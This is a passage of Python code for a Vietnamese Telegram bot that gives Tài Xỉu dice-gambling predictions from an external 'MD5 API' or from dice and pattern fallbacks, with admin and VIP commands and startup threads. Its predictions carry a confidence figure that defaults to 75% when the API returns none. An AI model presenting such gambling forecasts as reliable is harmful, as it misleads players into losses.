    ep = _md5_state["working_endpoint"] or "(chưa tìm thấy)"

    if result:
        emo = "🔵 TÀI" if result["prediction"] == "TAI" else "🔴 XỈU"
        sess = result.get("session") or "N/A"
        res = result.get("result") or "(chưa có)"
        conf = result.get("confidence", 75)
        text = (
            f"🌐 <b>LE MINH MD5 API</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 Base: <code>{base}</code>\n"
            f"📌 Endpoint: <code>{ep}</code>\n"
            f"🟢 Status: <b>ONLINE</b>\n"
            f"⏱ Success: <code>{stats['last_success_at'] or 'N/A'}</code>\n\n"
            f"🎯 Dự đoán: <b>{emo}</b> ({conf}%)\n"
            f"📊 Phiên API: <code>{sess}</code>\n"
            f"📋 Kết quả: <code>{res}</code>\n\n"
            f"📈 Stats: {stats['success']} ✅ / {stats['fail']} ❌\n"
            f"🔘 Toggle: {'BẬT' if USE_MD5_API else 'TẮT'}"
        )
    else:
        text = (
            f"🌐 <b>LE MINH MD5 API</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 Base: <code>{base}</code>\n"
            f"🔴 Status: <b>OFFLINE / LỖI</b>\n"
            f"⏱ Last fail: <code>{stats['last_fail_at'] or 'N/A'}</code>\n\n"
            f"⚠️ <i>Đang dùng fallback DICE/CAU</i>\n"
            f"💡 <b>Cách xử lý:</b>\n"
            f"1. Đợi 30s (Render free đang wake up)\n"
            f"2. Thử /api lại\n"
            f"3. Nếu vẫn lỗi, admin dùng /setapi &lt;url&gt;"
        )
    bot.edit_message_text(text, chat_id=message.chat.id,
                          message_id=msg_proc.message_id, parse_mode="HTML")

@bot.message_handler(commands=['md5'])
def handle_md5_toggle(message):
    if message.chat.id != ADMIN_ID: return
    global USE_MD5_API
    parts = message.text.split()
    if len(parts) > 1 and parts[1].lower() == "on":
        USE_MD5_API = True
        _md5_state["data"] = None
        bot.reply_to(message, "✅ <b>MD5 API: BẬT</b>", parse_mode="HTML")
    else:
        USE_MD5_API = False
        bot.reply_to(message, "🔴 <b>MD5 API: TẮT</b>\n<i>Đang dùng DICE + CAU</i>", parse_mode="HTML")

@bot.message_handler(commands=['setapi'])
def handle_setapi(message):
    if message.chat.id != ADMIN_ID: return
    global MD5_API_BASE
    try:
        url = message.text.split(maxsplit=1)[1].strip()
        if not url.startswith("http"):
            return bot.reply_to(message, "❌ URL phải bắt đầu bằng http(s)")
        MD5_API_BASE = url.rstrip("/")
        _md5_state["working_endpoint"] = None
        _md5_state["data"] = None
        _md5_state["warmed_up"] = False
        bot.reply_to(message, f"✅ Đã đổi API base: <code>{MD5_API_BASE}</code>", parse_mode="HTML")
        threading.Thread(target=warm_up_md5_api, daemon=True).start()
    except:
        bot.reply_to(message, "👉 <code>/setapi https://leminhapiik.onrender.com</code>", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
def stop_websocket(message):
    if not is_vip(message.chat.id): return
    if message.chat.id in active_sockets:
        active_sockets[message.chat.id].disconnect()
        del active_sockets[message.chat.id]
        bot.reply_to(message, "🔌 Đã dừng bot.")

# ==========================================
# 🚀 MAIN
# ==========================================
if __name__ == "__main__":
    print("=" * 55)
    print("🤖 AI TÀI XỈU — MD5 API + CẦU + XÚC XẮC")
    print("=" * 55)

    # 1. Flask health-check
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("✅ Flask health-check OK")

    # 2. Keep-alive
    threading.Thread(target=keep_alive_ping, daemon=True).start()
    logger.info("✅ Keep-alive OK")

    # 3. Warm-up MD5 API
    threading.Thread(target=warm_up_md5_api, daemon=True).start()
    logger.info("✅ MD5 API warm-up đang chạy ngầm")

    # 4. Background data collector
    threading.Thread(target=background_data_collector, daemon=True).start()
    logger.info("✅ Data collector OK")

    # 5. Telegram bot
    logger.info("🚀 Bot Telegram khởi động...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
